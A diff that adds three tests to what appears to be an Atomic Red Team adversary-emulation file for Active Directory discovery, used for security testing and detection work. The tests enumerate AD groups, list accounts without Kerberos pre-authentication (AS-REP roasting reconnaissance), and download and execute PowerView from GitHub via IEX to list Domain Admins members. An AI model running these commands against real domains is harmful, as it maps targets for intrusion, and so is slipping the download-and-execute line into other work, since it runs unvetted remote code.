@@ -133,3 +133,50 @@ atomic_tests:
     command: |
       #{adfind_path} -f (objectcategory=group)
     name: command_prompt
+- name: Enumerate Active Directory Groups with ADSISearcher
+  description: |
+    The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.
+    Upon successful execution a listing of groups will output with their paths in AD.
+    Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      ([adsisearcher]"objectcategory=group").FindAll(); ([adsisearcher]"objectcategory=group").FindOne()
+- name: Get-ADUser Enumeration using UserAccountControl flags (AS-REP Roasting)
+  description: |
+    When successful, accounts that do not require kerberos pre-auth will be returned.
+    Reference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html
+  supported_platforms:
+    - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Computer must be domain joined.
+    prereq_command: |
+      if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Write-Host Joining this computer to a domain must be done manually.
+  - description: |
+      Requires the Active Directory module for powershell to be installed.
+    prereq_command: |
+      if(Get-Module -ListAvailable -Name ActiveDirectory) {exit 0} else {exit 1}
+    get_prereq_command: |
+      Add-WindowsCapability -Online -Name "Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0"
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name
+- name: Get-DomainGroupMember with PowerView
+  description: |
+    Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember "Domain Admins"
+    name: powershell
